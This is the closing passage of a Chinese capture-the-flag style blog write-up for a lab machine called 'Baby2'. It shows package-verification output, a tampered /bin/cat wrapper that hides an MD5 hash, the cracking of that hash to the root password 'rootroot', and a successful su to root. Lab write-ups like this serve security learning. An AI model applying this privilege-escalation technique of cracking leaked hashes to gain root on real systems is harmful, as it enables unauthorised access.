+</span></span><span class=line><span class=cl>dpkg: warning: systemd: unable to open /var/lib/polkit-1/localauthority/10-vendor.d/systemd-networkd.pkla <span class=k>for</span> hash: Permission denied
+</span></span><span class=line><span class=cl>??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/systemd-networkd.pkla
+</span></span><span class=line><span class=cl>??5?????? c /etc/grub.d/10_linux
+</span></span><span class=line><span class=cl>??5?????? c /etc/grub.d/40_custom
+</span></span><span class=line><span class=cl>dpkg: warning: sudo: unable to open /etc/sudoers <span class=k>for</span> hash: Permission denied
+</span></span><span class=line><span class=cl>??5?????? c /etc/sudoers
+</span></span><span class=line><span class=cl>dpkg: warning: sudo: unable to open /etc/sudoers.d/README <span class=k>for</span> hash: Permission denied
+</span></span><span class=line><span class=cl>??5?????? c /etc/sudoers.d/README
+</span></span><span class=line><span class=cl>dpkg: warning: inspircd: unable to open /etc/inspircd/inspircd.conf <span class=k>for</span> hash: Permission denied
+</span></span><span class=line><span class=cl>??5?????? c /etc/inspircd/inspircd.conf
+</span></span><span class=line><span class=cl>dpkg: warning: inspircd: unable to open /etc/inspircd/inspircd.motd <span class=k>for</span> hash: Permission denied
+</span></span><span class=line><span class=cl>??5?????? c /etc/inspircd/inspircd.motd
+</span></span><span class=line><span class=cl>dpkg: warning: inspircd: unable to open /etc/inspircd/inspircd.rules <span class=k>for</span> hash: Permission denied
+</span></span><span class=line><span class=cl>??5?????? c /etc/inspircd/inspircd.rules
+</span></span><span class=line><span class=cl>dpkg: warning: packagekit: unable to open /var/lib/polkit-1/localauthority/10-vendor.d/org.freedesktop.packagekit.pkla <span class=k>for</span> hash: Permission denied
+</span></span><span class=line><span class=cl>??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/org.freedesktop.packagekit.pkla
+</span></span><span class=line><span class=cl>??5?????? c /etc/issue
+</span></span></code></pre></div><p>丢给ds老师分析<br>得到结论<br>/bin/cat - 核心系统工具被修改（高度可疑）</p><p>那么就去一探究竟看看</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tuf@Baby2:/home/aristore$  strings /bin/cat
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
+</span></span><span class=line><span class=cl><span class=o>[[</span> <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span> <span class=o>==</span> user.txt <span class=o>]]</span> <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;flag{fake-flag}&#34;</span> <span class=o>&amp;&amp;</span> <span class=nb>exit</span> <span class=m>1</span>
+</span></span><span class=line><span class=cl>/usr/bin/cat2 <span class=s2>&#34;</span><span class=nv>$@</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1># b4b8daf4b8ea9d39568719e1e320076f</span>
+</span></span></code></pre></div><p>可疑的md5，我一撞。rootroot出来了，得到了root的密码，直接切换即可</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tuf@Baby2:/home/aristore$ su root
+</span></span><span class=line><span class=cl>Password: 
+</span></span><span class=line><span class=cl>root@Baby2:/home/aristore# id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+</span></span></code></pre></div></div><footer class=post-footer><div class=post-footer__tags><a href=/tags/%E9%9D%B6%E6%9C%BA/ data-pagefind-filter=tag>靶机</a></div><div class=post-footer__license>Licensed under CC BY-NC-SA 4.0</div><nav class=post-footer__nav><a href=/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby/><small>← Previous</small>
+<span>群友靶机Baby</span>
+</a><a href=/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby3/ class=post-footer__nav-next><small>Next →</small>
+<span>群友靶机baby3</span></a></nav></footer></article></div></div><footer class=site-footer><div class=container><div class=site-footer__social><a href=https://github.com/GCXWLP target=_blank rel=noopener title=GitHub><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
+</a><a href=mailto:eminemgcxwlp@gmail.com target=_blank rel=noopener title=Email><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</a><a href=/index.xml target=_blank rel=noopener title=RSS><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><div class=site-footer__copy>&copy; 2025 - 2026 Twansh's blog</div><div class=site-footer__stats><span>65 posts</span>
+<span>73.3k words</span></div><div class=site-footer__powered>Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a></div></div></footer><div class=search-overlay id=search-overlay role=dialog aria-label=Search><div class=search-overlay__dialog><div class=search-overlay__input-wrap><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+<input type=text id=search-input placeholder=搜索文章标题、标签、分类或正文... autocomplete=off></div><div class=search-overlay__results id=search-results><div class=search-overlay__empty>输入关键词开始搜索</div></div></div></div><script defer src=/js/theme-toggle.min.9d3288aa4ff1e33e40906fb67350ea3f5dad1533f19d7428a2335ceac6bf3c4e.js></script><script defer src=/js/search.min.6145f9c11b47c22f4014c24c80522fe739d7844fc997719a3bc26c050c908051.js></script><script defer src=/js/code-copy.min.f61de5ab74980e8e52ca0081d6fedb33bc5496b41391a410ef15ed6e014e502d.js></script></body></html>
